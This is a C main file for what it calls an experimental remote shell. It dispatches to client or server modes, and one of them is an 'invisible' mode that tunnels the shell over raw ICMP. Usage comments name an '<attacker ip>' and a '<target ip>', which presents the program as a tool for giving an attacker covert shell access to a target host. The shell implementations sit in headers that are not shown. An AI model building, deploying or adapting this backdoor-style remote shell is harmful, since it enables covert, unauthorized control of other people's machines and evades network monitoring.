#include <stdlib.h>
#include <stdio.h>
#include "invisible_shell.h"
#include "secure_shell.h"
#include "shell.h"

#include "client.h"
#include "server.h"

#define SECURE
//#define INVISIBLE


// sudo tcpdump -nnXSs 0 -i lo icmp
// sudo ./remote_shell_exe c <attacker ip>
// sudo ./remote_shell_exe s <target ip>

int main (int argc, char **argv)
{

  printf("%s\n", "This is an experimental remote shell.");
  if (!argv[1])
   {
     fprintf(stderr, "%s\n", "No arguments have been specified.");
     return EXIT_FAILURE;
   }

  if('c' == argv[1][0] && !argv[2])
   {
     fprintf(stderr, "%s\n", "Wrong number of arguments:"
     "For client specify IP address and port number.");
     return EXIT_FAILURE;
   }
  else if (!argv[1])
   {
     fprintf(stderr, "%s\n", "Wrong number of arguments:"
     "Specify server port.");
     return EXIT_FAILURE;
   }

  #ifdef INVISIBLE
      printf("%s\n", "INVISIBLE");
      int i = 1;
      net_read = net_read_icmp;
      net_write = net_write_icmp;;
      if (argv[i][0] == 's')
        invisible_shell (raw_init (argv[i+1], IPPROTO_ICMP));
      else if (argv[i][0] == 'c')
        async_read_invisible (raw_init (argv[i+1], IPPROTO_ICMP), 0);
  #else
    #ifdef SECURE
       printf("%s\n", "SECURE");
       if (argv[1][0] == 'c')
          {
            char *ip_addr = argv[2];
            char *remote_port = argv[3];
            async_read (client_init (ip_addr, atoi(remote_port)), 0);   // CLIENT
          }
       else if (argv[1][0] == 's')
          {
            char *server_port = argv[2];
            secure_shell (server_init (atoi(server_port))); // SERVER: client to stdin(i.e. 0)
          }
    #else
        printf("%s\n", "NOT SECURE");
        if (argv[1][0] == 'c')
          start_shell (client_init (argv[2], atoi(argv[3])));
        else
          start_shell (server_init (atoi(argv[2])));
    #endif
  #endif

  return 0;
}
